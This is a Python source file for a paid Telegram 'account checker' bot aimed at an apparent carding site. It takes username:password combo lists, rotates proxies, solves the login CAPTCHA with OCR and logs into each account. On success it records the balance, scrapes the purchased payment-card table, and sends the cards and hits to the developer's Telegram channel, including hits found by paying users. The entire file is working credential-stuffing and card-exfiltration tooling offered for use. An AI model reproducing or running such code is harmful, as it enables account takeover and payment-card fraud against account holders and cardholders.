import os
import re
import random
import requests
from io import BytesIO
from PIL import Image
from bs4 import BeautifulSoup
import easyocr
import telebot
from telebot import types
import warnings
import json
import time
import logging

# Suppress specific warnings
warnings.filterwarnings("ignore", category=UserWarning)

# === Configuration ===
TOKEN = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Replace with your bot's token
ADMIN_ID = xxxxxxx  # Replace with your Telegram user ID
ADMIN_CHANNEL = -xxxxxxxx  # Replace with your private channel username
BASE_URL = "https://savastan0.tools"
LOGIN_PAGE = f"{BASE_URL}/login"
CAPTCHA_URL = f"{BASE_URL}/captcha.php"
LOGIN_ACTION_URL = LOGIN_PAGE
reader = easyocr.Reader(['en'], gpu=False)

# Welcome images list
WELCOME_IMAGES = [
    "https://graph.org/file/c6c9ccb29eb5fbca82206-f1440d53a2ad1ad816.jpg",
    "https://graph.org/file/e5886db8d5bdac9c10ddf-0a027c155ae70f73b2.jpg",
    "https://graph.org/file/f43b1bb62dcaf16c362ae-df5dcd5220f128cb4a.jpg"
]

# === Logging Configuration ===
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# === Ensure directories ===
os.makedirs("html_logs", exist_ok=True)
os.makedirs("captchas", exist_ok=True)
os.makedirs("data", exist_ok=True)

# === User Management ===
AUTHORIZED_USERS_FILE = "data/authorized_users.json"

def load_authorized_users():
    if os.path.exists(AUTHORIZED_USERS_FILE):
        with open(AUTHORIZED_USERS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_authorized_users(users):
    with open(AUTHORIZED_USERS_FILE, 'w') as f:
        json.dump(users, f)

def is_authorized(user_id):
    authorized_users = load_authorized_users()
    return user_id in authorized_users or user_id == ADMIN_ID

def add_user(user_id):
    authorized_users = load_authorized_users()
    if user_id not in authorized_users:
        authorized_users.append(user_id)
        save_authorized_users(authorized_users)

def remove_user(user_id):
    authorized_users = load_authorized_users()
    if user_id in authorized_users:
        authorized_users.remove(user_id)
        save_authorized_users(authorized_users)

# === Load proxies if needed ===
def load_proxies():
    if not os.path.exists("proxy.txt"):
        return []
    with open("proxy.txt", encoding='utf-8', errors='ignore') as f:
        return [p.strip() for p in f if p.strip()]

# === Accurate Balance Extraction ===
def extract_balance(html):
    soup = BeautifulSoup(html, "html.parser")
    for tag in soup.find_all("div"):
        if "balance" in tag.get_text().lower():
            match = re.search(r"balance:\s*([\d.,]+)\$", tag.get_text(), re.I)
            if match:
                return float(match.group(1).replace(',', ''))
    match = re.search(r'Balance:\s*<strong>\s*([\d.,]+)\$\s*</strong>', html, re.I)
    if match:
        return float(match.group(1).replace(',', ''))
    return 0

# === Extract Cards Table ===
def extract_cards_table(html):
    try:
        soup = BeautifulSoup(html, "html.parser")
        cards = []
        
        # Look for table with card data
        tables = soup.find_all("table")
        for table in tables:
            rows = table.find_all("tr")
            for row in rows[1:]:  # Skip header row
                cells = row.find_all("td")
                if len(cells) >= 4:  # Assuming at least 4 columns for card data
                    card_info = " | ".join([cell.get_text().strip() for cell in cells])
                    if card_info and any(char.isdigit() for char in card_info):
                        # Clean the card info - remove extra spaces and format properly
                        card_info = re.sub(r'\s+', ' ', card_info.strip())
                        cards.append(card_info)
        
        return cards
    except Exception as e:
        logging.error(f"Error extracting cards: {e}")
        return []

# === Fetch Login Page (cookies, headers) ===
def fetch_login_page(session):
    session.headers.update({
        "User -Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Referer": LOGIN_PAGE,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    })
    try:
        session.get(LOGIN_PAGE, timeout=10)
    except Exception as e:
        logging.error(f"Error fetching login page: {e}")

# === Download CAPTCHA Image ===
def download_captcha(session, combo_id):
    try:
        t = random.random()
        url = f"{CAPTCHA_URL}?_CAPTCHA&t={t}"
        r = session.get(url, timeout=10)
        img = Image.open(BytesIO(r.content))
        path = f"captchas/captcha_{combo_id}.png"
        img.save(path)
        return path
    except Exception as e:
        logging.error(f"Error downloading CAPTCHA: {e}")
        return None

# === OCR Solver ===
def solve_captcha_easyocr(img_path):
    try:
        result = reader.readtext(img_path, detail=0, paragraph=False)
        raw = ''.join(result).strip()
        clean = re.sub(r'[^a-zA-Z0-9]', '', raw)
        return clean
    except Exception as e:
        logging.error(f"Error during OCR: {e}")
        return ''

# === Error Type Detector ===
def analyze_failure(html_text):
    text = html_text.lower()
    if "captcha" in text:
        return "CAPTCHA Error"
    if "invalid" in text or "incorrect" in text or "wrong password" in text:
        return "Credentials Error"
    return "Unknown Error"

# === Main Login Function ===
def attempt_login(session, username, password, captcha_code, combo_id):
    try:
        payload = {
            "username": username,
            "password": password,
            "CAPTCHA": captcha_code,
            "login": "Login"
        }

        headers = {
            "X-Requested-With": "XMLHttpRequest",
            "Referer": LOGIN_PAGE
        }

        r = session.post(LOGIN_ACTION_URL, data=payload, headers=headers, timeout=10)
        text = r.text.lower()

        if "logout" in text or "dashboard" in text or "location.href" in text:
            home = session.get(f"{BASE_URL}/index", timeout=10)
            html = home.text
            with open(f"html_logs/{username}_final_{combo_id}.html", "w", encoding="utf-8") as f:
                f.write(html)
            balance = extract_balance(html)
            
            if balance > 0:
                result = f"[⌯] {username}:{password} ➤ Login OK | 💰 Balance: {balance}$"
                with open("good.txt", "a") as f:
                    f.write(f"{username}:{password} | Balance: {balance}$\n")
                
                # === Go to Purchased Page ===
                try:
                    purchased = session.get(f"{BASE_URL}/?purchased", timeout=10)
                    if "My Cards" in purchased.text:
                        # === Simulate Click on "My Cards"
                        mycard = session.post(f"{BASE_URL}/?purchased", data={"mycard": "My Cards"}, timeout=10)
                        
                        # === Switch from 20 to All
                        all_cards = session.post(f"{BASE_URL}/?purchased", data={"carddatatable_length": "-1"}, timeout=10)
                        
                        # === Extract Table
                        card_data = extract_cards_table(all_cards.text)
                        if card_data:
                            # Save to file
                            with open("cards_dumped.txt", "a", encoding="utf-8") as f:
                                f.write(f"\n[:User  {username} | Balance: {balance}$]\n")
                                for line in card_data:
                                    f.write(line + "\n")
                            
                            # Send to admin channel if more than 100 cards
                            if len(card_data) > 100:
                                send_cards_as_text(card_data)
                            else:
                                send_cards_formatted(card_data)
                except Exception as e:
                    logging.error(f"Error extracting cards for {username}: {e}")
                
                return result, True
            else:
                result = f"[⌯] {username}:{password} ➤ Login OK | 💰 Balance: 0$"
                with open("zero_balance.txt", "a") as f:
                    f.write(f"{username}:{password} | Balance: 0$\n")
                return result, True
        else:
            reason = analyze_failure(r.text)
            result = f"[❌] {username}:{password} ➤ Failed | Reason: {reason}"
            with open("bad.txt", "a") as f:
                f.write(f"{username}:{password} | Reason: {reason}\n")
            return result, False
    except Exception as e:
        return f"[⚠️] {username}:{password} ➤ Error: {str(e)}", False

# === Telegram Bot ===
bot = telebot.TeleBot(TOKEN)

def send_cards_formatted(card_data):
    """Send cards in formatted HTML (for less than 100 cards)"""
    try:
        cards_message = f"<b>⌯ Satanic Database</b>\n\n"
        cards_message += f"<b>⌯ Cards Found:</b> <code>{len(card_data)}</code>\n\n"
        
        for i, card in enumerate(card_data[:10], 1):  # Limit to first 20 cards per message
            cards_message += f"<b>{card}</b>\n"
        
        if len(card_data) > 10:
            cards_message += f"\n<b>... and {len(card_data) - 20} more cards</b>"
        
        bot.send_message(ADMIN_CHANNEL, cards_message, parse_mode='HTML')
        
        # If more than 20 cards, send additional messages
        if len(card_data) > 10:
            remaining_cards = card_data[10:]
            for i in range(0, len(remaining_cards), 10):
                batch = remaining_cards[i:i+10]
                batch_message = f"<b>⌯ Batch {i//10 + 2}</b>\n\n"
                for card in batch:
                    batch_message += f"<b>{card}</b>\n"
                bot.send_message(ADMIN_CHANNEL, batch_message, parse_mode='HTML')
                time.sleep(1)  # Delay to avoid rate limiting
                
    except Exception as e:
        logging.error(f"Error sending formatted cards: {e}")

def send_cards_as_text(card_data):
    """Send all cards as plain text (for 100+ cards)"""
    try:
        # Create a text file with all card data
        filename = f"cards_dump_{int(time.time())}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("WELCOME TO SATANIC DATABASE \nVISIT @SatanicDB in TELEGRAM\n---------------------------------\n")
            for card in card_data:
                f.write(f"{card}\n")
        
        # Send the text file to the admin channel
        with open(filename, 'rb') as f:
            bot.send_document(ADMIN_CHANNEL, f, caption="DUMP DATABASE CONTAINS 100+ DATA")
        
        # Clean up the file
        os.remove(filename)
        
    except Exception as e:
        logging.error(f"Error sending cards as text: {e}")

def send_to_admin(message_text, user_info=None):
    """Send notification to admin"""
    try:
        if user_info:
            admin_message = f"<b>⌯ Admin Notification</b>\n\n<b>⌯ User:</b> {user_info}\n<b>⌯ Message:</b> {message_text}"
        else:
            admin_message = f"<b>⌯ Admin Notification</b>\n\n{message_text}"
        bot.send_message(ADMIN_ID, admin_message, parse_mode='HTML')
    except Exception as e:
        logging.error(f"Failed to send to admin: {e}")

def get_user_info(message):
    return f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    user_info = get_user_info(message)
    
    # Create inline keyboard
    markup = types.InlineKeyboardMarkup()
    x1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
    x2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
    markup.add(x1, x2)
    
    # Get random welcome image
    pic_url = random.choice(WELCOME_IMAGES)
    
    # Check authorization
    if not is_authorized(user_id):
        mention = f'<a href="https://t.me/{message.from_user.username}">{message.from_user.first_name}</a>' if message.from_user.username else message.from_user.first_name
        
        unauthorized_caption = (
            f"<b>• Welcome, to Savastan Account Checker Bot!</b>\n"
            "<b>• Dev: </b>@AkarshxD\n\n"
            "<blockquote>⌯ Sorry, you are not authorized to use this bot\n"
            "Contact the developer to get Paid access</blockquote>"
        )
        
        bot.send_photo(
            chat_id=message.chat.id,
            photo=pic_url,
            caption=unauthorized_caption,
            parse_mode="HTML",
            has_spoiler=True,
            reply_markup=markup
        )
        
        send_to_admin(f"Unauthorized access attempt by {user_info}")
        return
    
    # Authorized user welcome
    mention = f'<a href="https://t.me/{message.from_user.username}">{message.from_user.first_name}</a>' if message.from_user.username else message.from_user.first_name
    
    welcome_caption = (
        f"<b>• Welcome, to Savastan Account Checker Bot!</b>\n"
        "<b>• Dev- @AkarshxD </b>\n\n"
        "<blockquote>⌯ Send accounts in format: username:password\n"
        "Or upload a text file containing accounts\n\n"
        "⌯ Features:\n"
        "• Single account checking\n"
        "• Mass checking from files\n"
        "• Balance detection\n"
        "• Card extraction\n"
        "• Proxy support\n"
        "• Progress tracking</blockquote>"
    )
    
    bot.send_photo(
        chat_id=message.chat.id,
        photo=pic_url,
        caption=welcome_caption,
        parse_mode="HTML",
        has_spoiler=True,
        reply_markup=markup
    )

@bot.message_handler(commands=['adduser'])
def add_user_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Only admin can add users.")
        return
    
    try:
        user_id = int(message.text.split()[1])
        add_user(user_id)
        bot.reply_to(message, f"✅ <b>User {user_id} added to authorized list.</b>", parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ Usage: /adduser <user_id>")

@bot.message_handler(commands=['removeuser'])
def remove_user_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Only admin can remove users.")
        return
    
    try:
        user_id = int(message.text.split()[1])
        remove_user(user_id)
        bot.reply_to(message, f"✅ <b>User {user_id} removed from authorized list.</b>", parse_mode='HTML')
    except:
        bot.reply_to(message, "❌ Usage: /removeuser <user_id>")

@bot.message_handler(commands=['users'])
def list_users_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Only admin can view users list.")
        return
    
    authorized_users = load_authorized_users()
    if authorized_users:
        users_text = "<b>⌯ Authorized Users:</b>\n\n"
        for user_id in authorized_users:
            users_text += f"• {user_id}\n"
    else:
        users_text = "📝 No authorized users found."
    
    bot.reply_to(message, users_text, parse_mode='HTML')

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if not is_authorized(message.from_user.id):
        # Send unauthorized message with random image
        markup = types.InlineKeyboardMarkup()
        x1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
        x2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
        markup.add(x1, x2)
        
        pic_url = random.choice(WELCOME_IMAGES)
        unauthorized_caption = (
            "<b>🚫 Access Denied</b>\n\n"
            "<blockquote>You are not authorized to use this bot.\n"
            "Contact the administrator for access.</blockquote>"
        )
        
        bot.send_photo(
            chat_id=message.chat.id,
            photo=pic_url,
            caption=unauthorized_caption,
            parse_mode="HTML",
            has_spoiler=True,
            reply_markup=markup
        )
        return
    
    user_id = message.from_user.id
    user_info = get_user_info(message)
    combos = message.text.strip().splitlines()
    results = []
    good_results = []
    proxies = load_proxies()
    use_proxies = bool(proxies)

    # Send processing message
    processing_msg = bot.reply_to(message, "<b>⌯ Processing accounts...</b>", parse_mode='HTML')

    for idx, combo in enumerate(combos, 1):
        if ":" in combo:
            username, password = combo.split(":", 1)
            session = requests.Session()

            if use_proxies:
                proxy = random.choice(proxies)
                session.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            fetch_login_page(session)
            captcha_img_path = download_captcha(session, idx)

            if not captcha_img_path:
                results.append(f"[‼️] CAPTCHA download failed for {username}. Skipping.")
                continue

            captcha_code = solve_captcha_easyocr(captcha_img_path)

            if not captcha_code or len(captcha_code) < 3:
                results.append(f"[‼️] OCR failed for {username}. Skipping.")
                continue

            result, is_good = attempt_login(session, username, password, captcha_code, idx)
            results.append(result)
            if is_good:
                good_results.append(result)
                # Send hit immediately with random image
                markup = types.InlineKeyboardMarkup()
                x1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
                x2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
                markup.add(x1, x2)
                
                pic_url = random.choice(WELCOME_IMAGES)
                hit_caption = (
                    f"<b>⌯ SAVASTAN HIT FOUND</b>\n\n"
                    f"<blockquote><code>{result}</code></blockquote>"
                )
                
                bot.send_photo(
                    chat_id=user_id,
                    photo=pic_url,
                    caption=hit_caption,
                    parse_mode="HTML",
                    has_spoiler=True,
                    reply_markup=markup
                )
                
                # Send to admin only if user is not admin
                if user_id != ADMIN_ID:
                    admin_hit_caption = (
                        f"<b>⌯ NEW HIT FROM USER</b>\n\n"
                        f"⌯ User: {user_info}\n"
                        f"⌯ Hit: <code>{result}</code>"
                    )
                    
                    bot.send_photo(
                        chat_id=ADMIN_ID,
                        photo=pic_url,
                        caption=admin_hit_caption,
                        parse_mode="HTML",
                        has_spoiler=True,
                        reply_markup=markup
                    )

    # Delete processing message
    try:
        bot.delete_message(message.chat.id, processing_msg.message_id)
    except:
        pass

    # Send final summary with random image
    markup = types.InlineKeyboardMarkup()
    x1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
    x2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
    markup.add(x1, x2)
    
    pic_url = random.choice(WELCOME_IMAGES)
    summary_caption = (
        f"<b>⌯ Results Summary</b>\n\n"
        f"<blockquote>⌯ Total: {len(combos)}\n"
        f"⌯ Processed: {len(results)}\n"
        f"⌯ Successful: {len(good_results)}</blockquote>"
    )
    
    bot.send_photo(
        chat_id=user_id,
        photo=pic_url,
        caption=summary_caption,
        parse_mode="HTML",
        has_spoiler=True,
        reply_markup=markup
    )

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not is_authorized(message.from_user.id):
        # Send unauthorized message with random image
        markup = types.InlineKeyboardMarkup()
        x1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
        x2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
        markup.add(x1, x2)
        
        pic_url = random.choice(WELCOME_IMAGES)
        unauthorized_caption = (
            "<b>⌯ Access Denied</b>\n\n"
            "<blockquote>You are not authorized to use this bot.\n"
            "Contact the administrator for access.</blockquote>"
        )
        
        bot.send_photo(
            chat_id=message.chat.id,
            photo=pic_url,
            caption=unauthorized_caption,
            parse_mode="HTML",
            has_spoiler=True,
            reply_markup=markup
        )
        return
    
    user_id = message.from_user.id
    user_info = get_user_info(message)
    
    try:
        # Send processing message with random image
        markup = types.InlineKeyboardMarkup()
        x1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
        x2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
        markup.add(x1, x2)
        
        pic_url = random.choice(WELCOME_IMAGES)
        processing_caption = (
            "<b>⌯ Processing File...</b>\n\n"
            "<blockquote>Please wait while I process your file...</blockquote>"
        )

        processing_msg = bot.send_photo(
            chat_id=message.chat.id,
            photo=pic_url,
            caption=processing_caption,
            parse_mode="HTML",
            has_spoiler=True,
            reply_markup=markup
        )
        
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        with open("temp.txt", "wb") as new_file:
            new_file.write(downloaded_file)

        # Try different encodings
        combos = []
        for encoding in ['utf-8', 'latin-1', 'cp1252']:
            try:
                with open("temp.txt", "r", encoding=encoding) as f:
                    combos = [line.strip() for line in f.readlines() if ':' in line.strip()]
                break
            except UnicodeDecodeError:
                continue

        if not combos:
            error_caption = (
                "⌯ <b>Error</b>\n\n"
                "<blockquote>No valid combos found in file.\n"
                "Use format: username:password</blockquote>"
            )
            
            bot.edit_message_caption(
                chat_id=message.chat.id,
                message_id=processing_msg.message_id,
                caption=error_caption,
                parse_mode="HTML",
                reply_markup=markup
            )
            os.remove("temp.txt")
            return

        # Update processing message
        file_processing_caption = (
            f"<b>⌯ Processing {len(combos)} accounts from file...</b>\n\n"
            f"<blockquote>File: {message.document.file_name}\n"
            f"Accounts: {len(combos)}</blockquote>"
        )
        
        bot.edit_message_caption(
            chat_id=message.chat.id,
            message_id=processing_msg.message_id,
            caption=file_processing_caption,
            parse_mode="HTML",
            reply_markup=markup
        )

        results = []
        good_results = []
        proxies = load_proxies()
        use_proxies = bool(proxies)

        for idx, combo in enumerate(combos, 1):
            username, password = combo.split(":", 1)
            session = requests.Session()

            if use_proxies:
                proxy = random.choice(proxies)
                session.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            fetch_login_page(session)
            captcha_img_path = download_captcha(session, idx)

            if not captcha_img_path:
                results.append(f"[‼️] CAPTCHA download failed for {username}")
                continue

            captcha_code = solve_captcha_easyocr(captcha_img_path)

            if not captcha_code or len(captcha_code) < 3:
                results.append(f"[‼️] OCR failed for {username}")
                continue

            result, is_good = attempt_login(session, username, password, captcha_code, idx)
            results.append(result)
            
            if is_good:
                good_results.append(result)
                # Send hit immediately with random image
                hit_markup = types.InlineKeyboardMarkup()
                h1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
                h2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
                hit_markup.add(h1, h2)
                
                hit_pic_url = random.choice(WELCOME_IMAGES)
                hit_caption = (
                    f"<b>⌯ SAVASTAN HIT FOUND!</b>\n\n"
                    f"<blockquote><code>{result}</code></blockquote>"
                )
                
                bot.send_photo(
                    chat_id=user_id,
                    photo=hit_pic_url,
                    caption=hit_caption,
                    parse_mode="HTML",
                    has_spoiler=True,
                    reply_markup=hit_markup
                )
                
                # Send to admin only if user is not admin
                if user_id != ADMIN_ID:
                    admin_hit_caption = (
                        f"<b>⌯ NEW HIT FROM USER</b>\n\n"
                        f"⌯ User: {user_info}\n"
                        f"⌯ File: {message.document.file_name}\n"
                        f"⌯ Hit: <code>{result}</code>"
                    )
                    
                    bot.send_photo(
                        chat_id=ADMIN_ID,
                        photo=hit_pic_url,
                        caption=admin_hit_caption,
                        parse_mode="HTML",
                        has_spoiler=True,
                        reply_markup=hit_markup
                    )

            # Update progress every 20 accounts
            if idx % 20 == 0:
                progress_caption = (
                    f"⌯ <b>Progress Update</b>\n\n"
                    f"<blockquote>⌯ Progress: {idx}/{len(combos)}\n"
                    f"⌯ Hits Found: {len(good_results)}</blockquote>"
                )
                
                try:
                    bot.edit_message_caption(
                        chat_id=message.chat.id,
                        message_id=processing_msg.message_id,
                        caption=progress_caption,
                        parse_mode="HTML",
                        reply_markup=markup
                    )
                except:
                    pass

        # Delete processing message
        try:
            bot.delete_message(message.chat.id, processing_msg.message_id)
        except:
            pass

        # Send final summary with random image
        final_pic_url = random.choice(WELCOME_IMAGES)
        final_summary_caption = (
            f"<b>⌯ Final Results</b>\n\n"
            f"<blockquote>⌯ File: {message.document.file_name}\n"
            f"⌯ Total: {len(combos)}\n"
            f"⌯ Processed: {len(results)}\n"
            f"⌯ Successful: {len(good_results)}\n"
            f"⌯ Success Rate: {(len(good_results)/len(combos)*100):.1f}%</blockquote>"
        )
        
        bot.send_photo(
            chat_id=user_id,
            photo=final_pic_url,
            caption=final_summary_caption,
            parse_mode="HTML",
            has_spoiler=True,
            reply_markup=markup
        )

        os.remove("temp.txt")

    except Exception as e:
        logging.error(f"Error processing file: {e}")
        error_caption = (
            f"❌ <b>Error Processing File</b>\n\n"
            f"<blockquote>Error: {str(e)}</blockquote>"
        )
        
        pic_url = random.choice(WELCOME_IMAGES)
        markup = types.InlineKeyboardMarkup()
        x1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
        x2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
        markup.add(x1, x2)
        
        bot.send_photo(
            chat_id=message.chat.id,
            photo=pic_url,
            caption=error_caption,
            parse_mode="HTML",
            has_spoiler=True,
            reply_markup=markup
        )
        
        if os.path.exists("temp.txt"):
            os.remove("temp.txt")

# === Error Handler ===
@bot.message_handler(func=lambda message: True)
def handle_unknown(message):
    if not is_authorized(message.from_user.id):
        return
    
    markup = types.InlineKeyboardMarkup()
    x1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
    x2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
    markup.add(x1, x2)
    
    pic_url = random.choice(WELCOME_IMAGES)
    unknown_caption = (
        "<b>⌯ Unknown Command</b>\n\n"
        "<blockquote>Valid formats:\n"
        "• Send combos: username:password (one per line)\n"
        "• Upload combo file\n"
        "• Use commands: /start\n\n"
        "⌯ Admin commands:\n"
        "• /adduser <id>\n"
        "• /removeuser <id>\n"
        "• /users</blockquote>"
    )
    
    bot.send_photo(
        chat_id=message.chat.id,
        photo=pic_url,
        caption=unknown_caption,
        parse_mode="HTML",
        has_spoiler=True,
        reply_markup=markup
    )

# === Bot Startup ===
def initialize_bot():
    """Initialize bot and check proxy system"""
    print("🤖 Initializing Account Checker Bot...")
    
    # Notify admin with random image
    try:
        markup = types.InlineKeyboardMarkup()
        x1 = types.InlineKeyboardButton("‹ Developer ›", url="https://t.me/akarshxd")
        x2 = types.InlineKeyboardButton("‹ Channel ›", url="https://t.me/+mOwCk3xdPXgxNTQ1")
        markup.add(x1, x2)
        
        pic_url = random.choice(WELCOME_IMAGES)
        startup_caption = (
            "<b>⌯ Bot Started Successfully</b>\n\n"
                        f"<blockquote>⌯ Started at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
            "⌯ All systems operational\n"
            "⌯ Card extraction enabled\n"
            "⌯ Auto text dump for 100+ cards enabled</blockquote>"
        )
        
        bot.send_photo(
            chat_id=ADMIN_ID,
            photo=pic_url,
            caption=startup_caption,
            parse_mode="HTML",
            has_spoiler=True,
            reply_markup=markup
        )
    except Exception as e:
        logging.error(f"Failed to send startup message to admin: {e}")
    
    print("✅ Bot is running and ready!")

if __name__ == "__main__":
    while True:
        try:
            initialize_bot()
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Bot crashed with error: {e}")
            print(f"Bot crashed: {e}")
            print("Restarting in 5 seconds...")
            time.sleep(5)  # Wait before restarting

